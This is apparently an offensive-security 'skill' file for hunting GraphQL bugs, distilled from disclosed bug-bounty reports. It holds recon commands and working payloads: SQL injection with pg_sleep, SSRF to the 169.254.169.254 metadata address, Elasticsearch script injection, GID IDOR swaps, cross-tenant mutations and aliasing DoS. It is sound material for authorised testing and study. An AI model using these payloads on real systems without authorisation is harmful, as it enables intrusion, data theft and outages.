---
name: hunt-graphql
description: Hunting skill for GraphQL vulnerabilities, built from 73 assigned reports of which 61 full disclosed-report texts were mined. Covers broken field-level authorization and PII exposure (HackerOne #489146, GitLab #972355), node/GID IDOR (Shopify #2207248, HackerOne #978143), mutation IDOR including cross-tenant writes (Stripe #1066203, TikTok #984965), REST/GraphQL state desync and races (GitHub #2216036), SSRF and SQLi via GraphQL arguments (EXNESS #1864188, HackerOne #435066), DoS via aliasing/negative cost/circular introspection (HackerOne #3287208, Shopify #481518), CSRF via GET mutations (GitLab #1122408), introspection misconfiguration and WebSocket schema leaks (Nuri #862835), private-program oracles via single fields, filter `_or` bypasses, Elasticsearch script injection via `sort_query`, and aggregation-based private-data extraction. Use when hunting GraphQL on any target — the dominant bug class is authorization that exists in the REST layer but is missing in the resolver.
sources: hackerone_public, github, gitlab_security, shopify_security
report_count: 73
full_reports_read: 61
---

## Crown Jewel Targets

GraphQL concentrates an entire data model behind one endpoint. The highest-value targets are not the ones with the flashiest introspection output — they are the ones where a resolver forgets the authorization that the equivalent REST endpoint enforces. Across 61 full reports the recurring crown jewels are:

- **Multi-tenant B2B SaaS platforms** (Shopify, Stripe, TikTok, GitHub, HackerOne) — one tenant traversing another's objects via a relay Global ID is a critical finding. Reports #2207248, #1066203, and #984965 all turned a single swapped GID into cross-merchant or cross-tenant data access or writes.
- **Platforms that run REST and GraphQL over the same resources** — dual-write surfaces are race and desync factories. GitHub's #2216036 and Starbucks' #473742 show state that one API layer believes revoked while the other still grants it.
- **Any `node(id:)` / global-relay-ID resolver** — base64 `gid://Company/Type/123` IDs are decoded and dereferenced, often without rechecking that the caller owns object `123`. HackerOne alone produced #978143, #447930, #781150, and #800231 from this single pattern.
- **Queries that expose a single sensitive scalar** — `email`, `private_comment`, `payment_transactions`, `vpn_suspended`, `report_sources`, `industry`, `base_bounty`, `whitelisted_hackers.total_count`. A one-field leak is a valid, repeatable finding (#489146, #707433, #770209, #715192, #707406, #342978).
- **"No permission" / disabled / deactivated user contexts** — Shopify staff with no explicit permissions read payment balances (#417170) and activity feeds (#528940); GitLab and HackerOne let deactivated/disabled accounts keep querying GraphQL (#1192460, #608656).
- **Undocumented and internal mutations** — `fileCopy` (#981472), `BULK_OPERATIONS_FINISH` webhooks (#1350095), `createAdminUser`-style sensitive mutations. Introspection or a captured client query reveals operations the public docs never mention.
- **Arguments that reach a backend HTTP client, search cluster, or SQL query** — `source` → SSRF (#1864188), `sort_query` → Elasticsearch Painless execution (#3694007), `embedded_submission_form_uuid` → SQL injection (#435066). These escape GraphQL entirely and hit the underlying infrastructure.
- **Unauthenticated endpoints with no depth/complexity/batch limits** — single-request DoS via circular introspection (#2048725), mutation aliasing (#3287208), or negative query cost (#481518).

Payouts track blast radius: cross-tenant writes and PII-of-all-users top the list (#2122671 $12,500, #3287208 $12,500, #2207248 $5,000), while single-field oracles and "intended behavior" introspection sit at $0–$2,500.

### Why GraphQL concentrates risk (grounded in the pack)

Three structural properties make GraphQL different from hunting a REST API, and they explain why 61 of 73 reports share the same root cause:

- **One endpoint, many resolvers.** A single `/graphql` URL dispatches to dozens of independently written resolvers. Authorization is only as strong as the *weakest* resolver — #489146 exposed PII while neighboring fields were correctly protected. There is no single "route" to audit.
- **The client chooses the shape.** The query, not the server, decides which fields are returned. A developer who hardens the 20 fields used by the UI can still leave field 21 readable, which is exactly what happened with `report_sources` (#770209), `vpn_suspended` (#715192), `industry` (#707406), and `payment_transactions` (#707433).
- **The schema is self-documenting.** Introspection reports every field, argument, and mutation to anyone who asks (#291531, #1132803, #2886723). Even when disabled, suggestion errors and JS bundles leak it (#862835). Attackers do not have to guess what exists.

### Severity ranking observed in the corpus

| Finding class | Representative report | Observed severity / bounty |
|---|---|---|
| Mass PII / 2FA metadata exposure | #489146 | Critical, CVSS 9.3 — $0 |
| Cross-tenant write / destructive mutation IDOR | #2122671, #984965 | High — $12,500 |
| Cross-tenant read of PII / payment data | #2207248 | High — $5,000 |
| Persistent admin after revocation (REST/GraphQL desync) | #2216036 | High — $0 |
| SQL injection via argument | #435066 | Critical, CVSS 10.0 — $0 |
| SSRF via argument | #1864188 | Medium — $3,000 |
| DoS via aliasing / negative cost | #3287208, #481518 | Medium — $12,500 / $0 |
| Single-field private-program oracle | #770209, #715192, #707406 | Low — $500–$2,500 |
| Introspection enabled (policy-dependent) | #2886723, #1132803 | Informational — $0 |

**Rule of thumb:** an oracle about *existence* (is this program private?) is low; an oracle that returns *someone else's data* is medium-to-high; a mutation that *changes someone else's state* is high-to-critical.

---

## Attack Surface Signals

**URL Patterns to hunt** (from the mined corpus and recon join-points):
```
/graphql
/api/graphql
/api/graphql/
/v1/graphql
/api/v2/graphql
/admin/api/graphql
/admin/internal/web/graphql/core
/internal/graphql
/api/internal/graphql/requestAuthEmail
/[ID]/users/api
/graphql.json
/query
/gql
/graph
/graphql?embedded_submission_form_uuid=...
/graphql-explorer
```

**Response / request-shape signals:**
```
POST with {"query":"..."} / {"operationName":...,"variables":...,"query":...}
Content-Type: application/json paired with a GraphQL-shaped body
X-CSRF-Token present on POST but absent on GET (see #1122408)
X-Shopify-Web-Force-Proxy: 1  (internal admin GraphQL behind a proxy)
"__typename" / "__schema" / "data" / "errors" in any response body
Did you mean "X"?  -> schema is enumerable even when introspection is blocked
```

**JavaScript source patterns (grep client bundles):**
```javascript
"query {"        "mutation {"     "subscription {"
"__typename"     "operationName"  "GRAPHQL_URI"
"apollo"         "ApolloClient"   "graphql-tag"   "gql`"
"IntrospectionQuery"             "persistedQuery"
```

**Tech-stack signals:**
- Apollo Server/Client, Relay, `graphql-ruby`, `graphene`/`strawberry` (Python), `gqlgen` (Go), Lighthouse (Laravel), Hasura/PostGraphile (`where`/`_or` filter syntax — see #645299).
- GraphQL Playground / GraphiQL exposed in production (Sorare #2048725, On #1132803).
- WebSocket `graphql-ws` / subscription transport (Nuri #862835).
- A REST API and a GraphQL endpoint exposing the same nouns — the single biggest predictor of a desync or IDOR finding.

**Recon sources:**
- Wayback / `httpx` for `/graphql` paths and `beerify.shopifycloud.com`-style internal subdomains (#419883).
- `github.com` search for hardcoded queries: `"query {" site:target.com`.
- JS bundle mining with LinkFinder / `getallurls` for operation names like `fileCopy`, `BillingDocumentDownload`, `updateTeamsRepository`.
- Public changelogs and policy files — GitLab's deactivated-user rule was found by reading a changelog link (#1192460).

### Recon command cookbook

```bash
# Enumerate likely GraphQL endpoints across a scope
gau "$TARGET" | grep -Ei 'graphql|/gql|/query' | sort -u
echo "$TARGET" | waybackurls | grep -Ei 'graphql' | sort -u
echo "$TARGET" | httpx -path '/graphql,/api/graphql,/v1/graphql,/query' \
  -mc 200,400,401,403 -content-type application/json

# Confirm GraphQL regardless of status code (errors still confirm it)
for p in /graphql /api/graphql /v1/graphql /gql; do
  curl -s -o /tmp/g -w "%{http_code} $p\n" -X POST "https://$TARGET$p" \
    -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
  grep -q '__typename\|"data"\|"errors"' /tmp/g && echo "  -> GraphQL confirmed at $p"
done

# Subdomain sweep for internal GraphQL services (#419883 pattern)
subfinder -d "$TARGET" -silent | httpx -path '/graphql' -mc 200 | tee gql_hosts.txt

# Pull operation names out of every JS bundle (fileCopy, BillingDocumentDownload, ...)
gau "$TARGET" | grep -E '\.js$' | xargs -P 8 -I{} sh -c \
  'curl -s "{}" | grep -Eo "(query|mutation|subscription) [A-Za-z0-9_]+"' | sort -u

# Discover hidden query-string arguments on the GraphQL path (#435066)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://$TARGET/graphql?FUZZ=1'" -fs 0 -mc all
```

### What a positive signal actually looks like

```http
POST /graphql HTTP/1.1
Host: target.com
{"query":"query { team(handle:\"victim\"){ _id report_sources } }"}

HTTP/1.1 200 OK
{"data":{"team":{"_id":"...","report_sources":["HackerOne Platform"]}}}
```
This is the #770209 signature: a field that should be staff-only returns a value to an unauthenticated caller. The signal is the *value*, not the status code.

```http
HTTP/1.1 200 OK
{"data":{...},"errors":[{"message":"Cannot return null for non-nullable field ..."}]}
```
A partial `data` object beside an error is still a positive signal — #978143 leaked `private_comment` this way. Never discard an error-bearing response.

---

## Discovery Patterns From 61 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **The captured GraphQL request in Burp history** — *what to look for*: the exact `operationName`, `variables`, and query body the front end sends. Nearly every report in the pack begins by sending a real client request to Repeater and editing a single field — #981036, #1085332, #528940, #417170 all follow this. Capture first, mutate second.
2. **Introspection output** — *what to look for*: full `__schema` dump (HackerOne #291531, On #1132803, Shopify #2886723, Sorare #2048725). Enumerate every mutation whose name contains `Create`, `Update`, `Delete`, `Download`, `Copy`, `Admin`, `Session`, `Invite`, or `Subscription`. These are the authorization-sensitive operations.
3. **The `node(id:)` / relay-GID interface** — *what to look for*: any base64 `gid://` identifier. Decode it, change the numeric primary key, re-encode, and resend (#447930, #978143, #781150). Embedded form UUIDs and payment object IDs are classic targets.
4. **A second account at a lower privilege tier** — *what to look for*: the same query replayed as a no-permission staff user (#417170, #528940, #898528), a deactivated/disabled user (#1192460, #608656), or a user from a different tenant (#2207248, #984965, #1066203). Authorization bugs are differential, not absolute.
5. **The REST/GraphQL overlap map** — *what to look for*: resources writable through both layers. Compare `GET /api/v4/namespace/16048` (404) with the GraphQL `namespace` query that returned the data with no token (#614355). This delta is the finding.
6. **Recently shipped fields and features** — *what to look for*: changelog diffs and "new field" announcements. `team_profile` (#389600), `ActivityFeeds` (#528940), "Bounty Preferences" (#981036), and the new "Revoke user session" feature (#417382) were all fresh code with missing checks.
7. **Filter/sort/aggregation arguments** — *what to look for*: `where:`, `_or:`, `order_by:`, `aggs:`, `sort_query:`, `first:`. These reach a query builder or search cluster and are where secure-schema bypasses live (#645299, #955286, #3694007, #1838329).
8. **URL/identifier arguments** — *what to look for*: fields named `source`, `url`, `callbackUrl`, `webhookSubscription`, `uninstallUrl`. Each is an outbound-request or state-changing primitive waiting for an attacker-controlled value (#1864188, #1350095).
9. **Alternate transports** — *what to look for*: WebSocket `start` frames accepting an introspection query (#862835), and GET requests carrying `query=` (#1122408). Both bypass POST-only CSRF/introspection controls.
10. **Undocumented/internal endpoints** — *what to look for*: `/admin/internal/web/graphql/core`, `/api/unstable/graphql.json`, internal subdomains. The `fileCopy` mutation (#981472) and beer-consumption leak (#419883) were both found on non-public GraphQL surfaces.
11. **Public-code-search for mutation names** — *what to look for*: the exact mutation string in a repo, a gist, or a framework default. GitLab's deactivated-user policy and multiple HackerOne protectors were located by reading linked source (#1192460, #781150).
12. **Internal subdomains of a known platform** — *what to look for*: `beerify.shopifycloud.com`-style hosts running an undocumented GraphQL service (#419883). Enumerate parent-domain subdomains and probe each for `/graphql`.
13. **A second GraphQL instance sharing the same database** — *what to look for*: a public "playground" and a hardened app instance on the same domain (Sorare's `/federal/graphql` vs `/graphql`, #2048725). The weaker instance is the real target.
14. **Proxy-forwarded admin paths** — *what to look for*: an internal endpoint (`/admin/internal/web/graphql/core`) reachable through the public site with a proxy header (#981472, #1350095).
15. **Recently changed session/password logic** — *what to look for*: a "revoke session" or "change password" flow. GraphQL often keeps answering with the old token after the UI invalidates it (#283847, #417382).

**Anti-patterns that waste time (from the corpus):**
- Fuzzing field names randomly when a full introspection dump is available — enumerate first, then target sensitive names.
- Reporting introspection as a standalone finding where it is explicitly intended behavior (#2886723, #2048725). Use it as recon toward a concrete authz or DoS finding.
- Testing only the happy-path authenticated user. Every cross-tenant and no-permission finding here required a second identity.
- Treating a `200 OK` with an `"errors"` array as a failure — partial `data` beside an error is a common leak (#978143).
- Assuming a UI "delete" is a server-side delete. Re-query through GraphQL before closing the case (#1132606).

**Signal → first request map:**

| Observation | First request to send | Report example |
|---|---|---|
| Client sends a GID | Decode, increment PK, re-encode, re-query | #447930, #2207248 |
| New field appears in a change | Query that field as an unauthenticated user | #389600, #528940 |
| REST returns 404 for a resource | Same resource via GraphQL, no token | #614355 |
| A mutation with an `input` object | Replay as no-permission / other-tenant user | #417170, #1066203 |
| A `where`/`_or` filter | Sensitive field as second condition | #645299 |
| A URL-valued argument | Point at a Collaborator listener | #1864188 |
| A slow mutation | Alias it 50–200× and time it | #3287208 |

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Ranked by the frequency table of the 61 full reports. "Signal" = technique tag; count = reports containing it.

| Rank | Signal (count) | Why it matters | What to probe |
|---|---|---|---|
| 1 | `graphql` (61) | Every report is a GraphQL surface — baseline. | Map endpoint, transport, and schema before anything else. |
| 2 | `api-endpoint` (35) | Dual REST/GraphQL exposure predicts desync. | Diff the same resource across REST and GraphQL. |
| 3 | `graphql-technique` (27) | Relay IDs, fragments, aliases, introspection tricks. | Decode GIDs; alias a mutation; enumerate via suggestions. |
| 4 | `search-filter-sort` (23) | Filters reach the query builder, not just the view layer. | `where`, `_or`, `order_by`, `sort_query`, `aggs`. |
| 5 | `mutation-polyglot` (18) | Mutations are the write/state-change surface. | Replay every mutation as a low-priv and cross-tenant user. |
| 6 | `json-body` (16) | Body shape reveals operation names and typed inputs. | Edit `variables` and `input` objects directly. |
| 7 | `server-side-rendering` (16) | Rendered fields trust stored data and cached objects. | Re-query after "delete" (#1132606); test stored XSS (#1085546). |
| 8 | `admin-internal` (15) | Internal GraphQL often skips the public auth layer. | Probe `/admin/internal/...` and staff roles with no permissions. |
| 9 | `cookie-handling` (11) | Session state is frequently not revalidated in resolvers. | Reuse a deactivated/disabled/old session against GraphQL. |
| 10 | `misconfiguration` (10) | Introspection and playgrounds left on in prod. | Full introspection; check for GraphiQL/Playground. |
| 11 | `filter-bypass` (10) | One branch of a filter uses the insecure schema. | Second condition of `_or` / `and` (#645299). |
| 12 | `image-processing` (10) | Upload + render pipelines hide type-confusion bugs. | MIME swap `image/png` → `image/svg+xml` (#996041). |
| 13 | `public-code-search` (9) | Source reveals policies and hardcoded queries. | Search the org's repos for the mutation name. |
| 14 | `proxy-feature` (9) | A proxy forwards requests without re-checking authz. | Send internal GraphQL paths through the public proxy. |
| 15 | `url-fetching` (9) | URL args become server-side requests. | Point `source`/`url` at a Collaborator listener (#1864188). |
| 16 | `session-attack` (8) | Token/session invalidation lags behind UI revocation. | Query GraphQL after password change / session revoke (#283847, #417382). |
| 17 | `brute-otp-reset` (6) | Aliasing compresses OTP/verification brute force. | Alias the verify mutation 100× in one request (#3287208). |
| 18 | `cache-layer` (6) | Cached objects outlive their authorization. | Re-request a "removed" attachment (#1132606). |
| 19 | `xml-parser` (5) / `sso-oauth` (5) | Indirect parsers and auth providers feed GraphQL inputs. | Test SOAP/XML entry points and OAuth-scoped tokens (#1711938). |
| 20 | `dos-resource` (5) / `cloud-metadata` (3) / `blind-oob` (3) | Availability and out-of-band impact subclasses. | Circular fragments (#2048725), negative `first` (#481518), SSRF (#1864188). |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

Verbatim "how I found it" lines from the disclosed reports. Each is reproduced exactly as mined.

1. `[#981472]` "jack_mccracken is a skilled attacker he found an undocumented GraphQL API called `fileCopy`, he used this API to try to copy a file from his store `StorB` to `StoreA` (where he is a staff member)."
2. `[#1122408]` "The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header."
3. `[#996041]` "I started testing for unrestricted file uploads and quickly discovered a way to upload a corrupted file into Reddit."
4. `[#996041]` "I was able to bypass the MIME type of uploaded files first by uploading a normal PNG file to Reddit, intercepting the request with burp, and changing the content type from `image/png` to `image/svg+xml`"
5. `[#996041]` "When trying to upload there is infinite loading time and the post never actually gets posted, but I found a way to bypass this, first, you upload a completely normal PNG file and after it uploads, you do the aforementioned steps to upload an unrestricted file and you can successfully post the corrupted image."
6. `[#389600]` "I noticed there is new field `team_profile` added and using the graphql below the latest serious report and reports received in three months were exposed"
7. `[#419883]` "This gives hackers who discover this endpoint an advantage as we know what kinds of beer Shopify employees enjoy and can use this to win them over during the event."
8. `[#1132803]` "i've found a misconfiguration in your graphql Api on the endpoint https://www."
9. `[#1192460]` "2 i noticed that the rule for a deactivated user allows for :log_in (as it should) but it is restricted from :access_api(as it should) [link](https://gitlab."
10. `[#981036]` "I was excited to see if there was a way around this."
11. `[#2886723]` "i've found a misconfiguration in your graphql Api on the endpoint <<"
12. `[#528940]` "I noticed that `ActivityFeeds` are now being fetched by GraphQL call on Shopify."
13. `[#528940]` "But from my testing, I noticed that STAFF member with _NO EXPLICIT_ permissions can fetch store's activity feed by calling the vulnerable endpoint."
14. `[#481518]` "While looking into the graphql app I noticed an interesting implementation where each app has a bucket of query cost they are allowed to used in a given time with a certain refresh rate associated with it."
15. `[#481518]` "Now Using the app I noticed by calling something like `first(-100)` will give you a negative cost"
16. `[#2207248]` "Tested ID ██████ before I saw it was indeed embedding others' customers data."
17. `[#417382]` "I have found an Insufficient Session Expiration on implementation of the new `Revoke user session` feature of HackerOne here: https://hackerone."
18. `[#885539]` "If you found a valid snowflake, open `https://████████."

**Reading of the clues:** discovery is overwhelmingly *differential and observational* — "I noticed a new field," "I noticed ActivityFeeds are now fetched by GraphQL," "I was excited to see if there was a way around this." The researcher compares two states (old vs new field, REST vs GraphQL, privileged vs no-permission) rather than fuzzing blindly.

**Clue → technique → report mapping:**

| Clue | Technique it announced | Outcome |
|---|---|---|
| `[#981472]` undocumented `fileCopy` | Undocumented/internal mutation discovery | $2,000, cross-store file copy |
| `[#1122408]` GET skips `X-CSRF-Token` | Transport-specific control gap | $3,370, CSRF mutation execution |
| `[#996041]` MIME swap in upload | Type confusion in render pipeline | $500, corrupted-image upload |
| `[#389600]` new `team_profile` field | New-field regression testing | Sensitive report counts exposed |
| `[#419883]` endpoint discovery via introspection | Subdomain GraphQL sweep | $802, internal data disclosure |
| `[#1132803]` / `[#2886723]` introspection enabled | Schema enumeration recon | Informational; enabled deeper tests |
| `[#1192460]` deactivated-user policy | Cross-context authorization diff | $1,370, data access via GraphQL |
| `[#981036]` "way around this" | Client-side enforcement bypass | Bounty preference slider bypassed |
| `[#528940]` ActivityFeeds via GraphQL | REST→GraphQL migration regression | $500, no-permission feed read |
| `[#481518]` negative `first(-100)` | Cost-calculation abuse | Rate-limit bucket refilled |
| `[#2207248]` tested ID with others' data | Cross-tenant GID swap | $5,000, PII + card data |
| `[#417382]` Revoke user session feature | Stale-session / GraphQL-only path | $500, session not revoked |
| `[#885539]` valid snowflake | Object-ID brute-force oracle | Private list members disclosed |

**Pattern:** 9 of these 18 clues hinge on a *new or changed* feature, and 5 hinge on a *second identity or stale state*. Prioritize change-diffing and privilege-diffing over random payloads.

### Probe Checklist (15 concrete probes)

Run these in order; each maps to a mined report.

1. `[ ]` Send the full introspection query; if blocked, send `{ __typename }` and a bad field to harvest "Did you mean X?" suggestions.
2. `[ ]` Diff the same resource via REST and GraphQL with the same token — if REST 404s but GraphQL returns data, that is the finding (#614355).
3. `[ ]` Decode every `gid://` GID you see, increment the numeric ID, re-encode, and re-query (#447930, #978143).
4. `[ ]` Replay every captured query as a no-permission staff user (#417170), a deactivated user (#1192460), and a second tenant (#2207248).
5. `[ ]` Enumerate every mutation name containing `Create/Update/Delete/Download/Copy/Admin/Session` and test each unauthenticated (#3452015) and cross-tenant.
6. `[ ]` For each filter object, try the sensitive field as the *second* condition of `_or` (#645299) and as an `order_by` field (#955286).
7. `[ ]` Feed `aggs`/`terms` an enum of a field you should not see (#1838329).
8. `[ ]` Pass `sort_query` a scripted Elasticsearch sort and watch for per-document script execution (#3694007).
9. `[ ]` Point any URL/identifier argument at a Collaborator domain and watch for DNS/HTTP hits (#1864188).
10. `[ ]` Send a sensitive mutation as a GET with `query=` in the URL — no `X-CSRF-Token` (#1122408).
11. `[ ]` Alias the same mutation 50–200× in one request and time the response (#3287208).
12. `[ ]` Set `first`/`last` to a negative value and check whether the cost bucket refills (#481518).
13. `[ ]` Send a circular fragment to a public playground endpoint and measure single-request impact (#2048725).
14. `[ ]` Send introspection inside a WebSocket `start` frame on an unauthenticated connection (#862835).
15. `[ ]` After a "delete" or "revoke" via REST/UI, re-query the object through GraphQL (attachments #1132606, sessions #417382, password change #283847).

**Expected evidence / stop condition for each probe:**

| Probe | Positive evidence | Stop condition (not a finding) |
|---|---|---|
| 1. Introspection | Full type list or `Did you mean X?` suggestions | Schema is genuinely hidden and no JS strings leak fields |
| 2. REST/GraphQL diff | REST 404/403 vs GraphQL returns data | Both layers return the same authorization result |
| 3. GID swap | Response contains another object's data | Every swapped ID returns null/error consistently |
| 4. Privilege replay | Lower tier receives data it should not | All tiers are denied or all tiers have equal rights |
| 5. Sensitive mutations | Unauthenticated or cross-tenant mutation succeeds | Every mutation denies the lower tier |
| 6. `_or` second condition | Private records appear only with second-condition placement | Both conditions use the secure schema |
| 7. `order_by` | `total_count` differs for a hidden field | Counts are stable across sort fields |
| 8. `sort_query` | Ordering changes with a script's return value | Input is rejected or keyword-allowlisted |
| 9. URL argument | DNS/HTTP hit on the Collaborator listener | No outbound connection at all |
| 10. GET mutation | State change occurs without `X-CSRF-Token` | GET rejected or CSRF token still required |
| 11. Aliasing | Response time scales with alias count | Aliases are capped or run serially with no additive cost |
| 12. Negative `first` | Cost bucket refills after a negative query | Value is floored at zero or rejected |
| 13. Circular fragment | Single request consumes measurable CPU/memory | Depth limiter rejects the fragment |
| 14. WebSocket introspection | `start` frame returns schema fields | Connection requires auth or blocks introspection frames |
| 15. Stale object | Deleted/revoked object still resolves via GraphQL | Object is truly removed across all caches |

---

## Step-by-Step Hunting Methodology

1. **Discover and confirm the endpoint.** Spider JS bundles and Burp history for the body shapes in *Attack Surface Signals*. Confirm with `{ __typename }` or a minimal `__schema { queryType { name } }` request.

2. **Capture a genuine client request before crafting anything.** Repeater the exact `operationName`, `variables`, and query the app sends. The corpus shows nearly every finding starts from editing a real request, not from a hand-built query.

3. **Map the schema.** Use the full introspection query; export with `InQL` or `graphql-voyager`. If introspection is disabled, use field-suggestion errors, `clairvoyance`, or strings from JS bundles. When introspection is enabled by policy, treat it as free recon (Shopify #2886723, Sorare #2048725) and look for undocumented operations (#981472).

4. **Build the sensitive-operation inventory.** List every mutation that changes ownership, membership, permissions, sessions, files, webhooks, or billing, and every field named like a secret (`email`, `phone`, `token`, `private_*`, `*_count`, `balance`, `pin`).

5. **Run the differential authz matrix.** For each sensitive operation, replay across: unauthenticated, viewer, no-permission staff, regular member, admin, disabled/deactivated account, and a user from a different tenant. Record which tier is the first one that succeeds — a lower tier succeeding than REST allows is the bug.

6. **Hunt node/GID IDOR.** Decode each GID, swap the type and the numeric key, and test across tenant contexts. Pay special attention to ActiveResource-backed nodes where the identifier is concatenated into a backend URL (#800231).

7. **Map the REST/GraphQL overlap and test desync.** For each dual-written resource, run both orderings:
   - REST revoke → GraphQL re-assert → verify via REST (GitHub #2216036).
   - GraphQL mutate → REST read-back → compare state (Starbucks #473742).
   - "Delete" via UI → GraphQL re-query for the stale object (#1132606).

8. **Probe query-language layers.** Walk `where`/`_or`/`and`, `order_by`, `aggs`, and `sort_query` with a sensitive field as the second/filtered operand. Watch for response differences, not just errors (#645299, #955286, #1838329, #3694007).

9. **Test argument-driven infrastructure access.** Any argument that looks like a URL, host, path, or raw query string is an SSRF/SQLi/script-injection candidate. Point it at a canary first, then at internal targets (#1864188, #435066, #3694007).

10. **Test transport and CSRF controls.** Send a mutation as GET without CSRF token (#1122408); send introspection inside a WebSocket `start` frame (#862835); try alternate content types and HTTP parameter pollution when a WAF blocks `__schema`.

11. **Test resource exhaustion.** Alias a slow mutation, negative `first`, circular fragments, and deep batch arrays. Measure per-request cost and whether a rate-limit bucket can be drained or refilled (#3287208, #481518, #2048725).

12. **Validate stale authorization.** Reuse a session after password change, logout, or "revoke session" and confirm whether GraphQL still answers when the UI no longer does (#283847, #417382, #1192460, #608656).

13. **Confirm with a before/after PoC.** Capture the vulnerable response, then show the same request after the fix or from a control account. For oracles (private-program existence), show at least two inputs with different outputs (#715192, #770209, #347937).

14. **Document the exact reproduction chain.** Include the operation name, variables, the privilege tier used, and any GIDs. For desyncs, give the precise call order. Reproduce twice from a clean state before reporting.

### Triage decision tree

```
Replay request as a lower-privilege / other-tenant user
|
+-- Data returned that should be denied?
|     +-- Yes -> broken field-level authz or IDOR
|     |         Is it a single computed field (count, industry, vpn_suspended)?
|     |           -> Low-severity oracle (#770209, #715192, #707406)
|     |         Is it another object's PII / payment data?
|     |           -> High-severity cross-tenant read (#2207248, #972355)
|     +-- No  -> continue
|
+-- REST and GraphQL disagree about the same resource?
|     +-- Yes -> desync / race (#2216036, #473742)
|     +-- No  -> continue
|
+-- Does a "delete"/"revoke" fail to stick in GraphQL?
|     +-- Yes -> stale authorization (#1132606, #417382, #1192460)
|     +-- No  -> continue
|
+-- Does an argument reach URL / SQL / search?
|     +-- URL -> confirm SSRF with OOB callback (#1864188)
|     +-- SQL -> time-based confirmation (#435066)
|     +-- Sort string -> scripted-search test (#3694007)
|     +-- No  -> continue
|
+-- Does request shape or transport break a control?
      +-- GET mutation -> CSRF (#1122408)
      +-- WebSocket frame -> introspection leak (#862835)
      +-- Alias/cost/cycle -> DoS (#3287208, #481518, #2048725)
```

### Common dead ends to recognize early

- **Introspection on a program that explicitly allows it.** It is recon, not a finding. Pivot to a concrete authz or availability bug (#2886723, #2048725).
- **A GID that is correctly scoped.** If swapping the primary key returns null for every increment across all tenants, there is no IDOR — move on.
- **Alias batching against a single-threaded resolver.** Per the resolver model, serial execution means aliases alone do not win races; combine with parallel HTTP (see `hunt-race-condition`).
- **A slow mutation that is slow for legitimate reasons.** Confirm linearity across alias counts before calling it a DoS (#3287208: ~8s *per alias*).
- **Error-only responses with no `data`.** Without a leaked value, a state change, or a confirmed OOB callback, the report lacks impact.

---

## Payload & Detection Patterns

### Introspection and schema enumeration

```graphql
# Full introspection (H1 #291531, On #1132803, Shopify #2886723)
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { name kind fields { name type { name kind } } }
  }
}
```

```graphql
# Minimal probe when full introspection is blocked
{ __typename }
```

```graphql
# Field-suggestion oracle — parse "Did you mean X?"
{ unknownFieldThatDoesNotExist }
```

```graphql
# Aliased introspection to evade a naive __schema string filter
{ s: __schema { t: types { n: name } } }
```

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .

# WebSocket introspection (Nuri #862835) — inside a graphql-ws `start` frame:
# {"type":"start","id":"1","payload":{"query":"query IntrospectionQuery{ ... }"}}

inql -t https://target/graphql --generate-queries
python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w words.txt -o schema.json
graphql-cop -t https://target/graphql
```

### Relay GID / node IDOR

```graphql
# Decode the base64 id, change the PK, re-encode (#447930)
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
    ... on EmbeddedSubmissionForm { id _id ... }
  }
}
# Z2lk... == gid://hackerone/EmbeddedSubmissionForm/9  -> /10, /11, ...

# Single-field leaks via a node (#978143) and via a named root field (#770209)
query { node(id:"<gid>") { ... on SurveyRatingItem { private_comment recipient { email } } } }
query { team(handle:"victim") { _id report_sources payment_transactions { total_count } vpn_suspended industry } }
```

```bash
# HackerOne GIDs are base64 of gid://<owner>/<Type>/<id>
echo -n 'gid://hackerone/Team/13' | base64    # Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=
```

### Cross-tenant / mutation IDOR

```graphql
# Cross-tenant billing IDOR (#2207248)
query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }

# Cross-tenant write (#1066203, #984965)
mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", ...}) { ... } }
mutation { addRulesToPixelEvents(input:{...}) { ... } }

# No-permission staff reading a protected scalar (#417170, #898528, #528940)
query { shop { paymentsBalance { ... } } }
query { activityFeeds(first:10) { edges { node { ... } } } }
```

### Filter / sort / aggregation abuse

```graphql
# Secure-schema bypass: put the sensitive field SECOND in _or (#645299)
query {
  teams(where:{ _or: [ {state:{_eq:"soft_launched"}}, {state:{_eq:"soft_launched"}} ] }) { id }
}

# Filter oracle via ordering (#955286)
query { reports(order_by:{direction:ASC, field:jira_status}) { total_count nodes { url } } }

# Private data via aggregations (#1838329)
query { me { opportunities_search(query:{}, aggs:{results:{terms:{field:"handle"}}}) { aggs { results { buckets { key doc_count } } } } } }

# Elasticsearch Painless script execution via sort_query (#3694007)
query { search(sort_query: "{\"script\":{\"type\":\"number\",\"script\":{\"source\":\"doc['_seq_no'].value\"}}}") { ... } }
```

### SSRF, SQLi, and script injection via arguments

```graphql
# SSRF via a URL-valued argument (#1864188) — confirm with a Collaborator listener first
query { allTicks(source:"http://YOUR_ID.oast.pro/") { ... } }
query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { ... } }

# SQL injection via a query-string argument appended to /graphql (#435066)
curl -X POST 'https://target.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep(10)%3B--%27'
# Confirm by scaling pg_sleep(1) -> (5) -> (10) and timing the response.
```

```bash
# Blind SSRF gate: DNS/HTTP hit on the listener is mandatory before claiming impact.
interactsh-client -v
```

### DoS, aliasing, and cost abuse

```graphql
# Mutation aliasing (#3287208) — server executes each alias, +~8s each
mutation {
  a1: verifyAccountRecoveryPhoneNumber(input:{...}) { ... }
  a2: verifyAccountRecoveryPhoneNumber(input:{...}) { ... }
  a3: verifyAccountRecoveryPhoneNumber(input:{...}) { ... }
}

# Negative cost refills the bucket (#481518)
query { appInstallations(first: -1000) { edges { node { id } } } }

# Circular fragment / resource exhaustion (#2048725)
